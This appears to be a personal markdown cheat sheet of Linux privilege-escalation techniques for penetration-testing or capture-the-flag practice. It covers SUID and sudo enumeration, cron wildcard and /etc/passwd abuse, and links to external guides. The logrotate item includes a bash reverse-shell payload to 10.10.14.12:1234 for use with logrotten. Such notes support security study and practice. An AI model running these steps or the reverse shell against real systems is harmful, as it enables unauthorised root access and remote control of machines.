## Process working on the machine to check

- Monitor process : ```pspy```

## SUID

- gtfobins

## Ways to escalate

- Using SUID to become root : https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

- Use LinuxPrivChecker or LinEnum, or https://github.com/pentestmonkey/unix-privesc-check or linux smart enumeration.

- Search file in the home directory

- Find the file with suid : ```find / -perm -u=s -type f 2>/dev/null```


- ```sudo -l``` to find what can be used with that user as a root !!!!
You have the application, and where you have to use if you want to do it without password pay attention !!!! If it's a particular user, do : ```sudo -u <user> <command>```


- logrotate : if it's executed by the root user with a crontask, and you have control on a log file, use logrotten : add lot of things inside log file, check if the size after the logrotate command has changed. If it's okay :  bash -c "bash -i >& /dev/tcp/10.10.14.12/1234 0>&1" in a file (payload for example). Then ./logrotten -p payload \<path to the log file which is rotate\>. Then write data inside the log file : echo "blabla" > \<log file\>

- Wildcards used in cron jobs ? Use it to your advantage ! **https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/**

- Any interpreter with Right of other user ? try to execute bash command. (/bin/bash)

## Having access to /etc/passwd :
https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/


## Crontab to root:

https://v3ded.github.io/ctf/htb-europa.html


## CHECK NETWORK 
- ```netat -antup```
- if it's 127.0.0.1:<port> : it's a loopback, it's not accessible from the outside


## Tmux owned by root ?
